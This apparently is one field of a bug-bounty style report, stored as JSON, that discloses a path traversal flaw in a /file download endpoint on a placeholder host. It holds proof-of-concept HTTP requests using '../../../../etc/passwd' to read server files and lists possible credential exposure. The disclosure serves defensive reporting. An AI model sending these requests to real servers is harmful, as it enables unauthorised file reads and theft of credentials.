  "vulnerability_information": "## Summary\nThe file download endpoint at `/file` is vulnerable to path traversal. The `name` parameter is used directly in a file path without sanitization, allowing an attacker to read arbitrary files from the server filesystem.\n\n## Steps to Reproduce\n1. Access the normal file endpoint:\n   ```\n   GET /file?name=readme.txt HTTP/1.1\n   Host: target.com\n   ```\n   This returns the readme file normally.\n\n2. Use path traversal to read /etc/passwd:\n   ```\n   GET /file?name=../../../../etc/passwd HTTP/1.1\n   Host: target.com\n   ```\n3. The server returns the contents of /etc/passwd\n\n## Proof of Concept\n```http\nGET /file?name=../../../../etc/passwd HTTP/1.1\nHost: target.com\n```\n\nThe server responds with the contents of `/etc/passwd`, confirming arbitrary file read.\n\n## Impact\n- Read any file accessible to the web server process\n- Access to /etc/passwd reveals system users\n- Access to configuration files could expose database credentials\n- Potential to read application source code and discover further vulnerabilities",
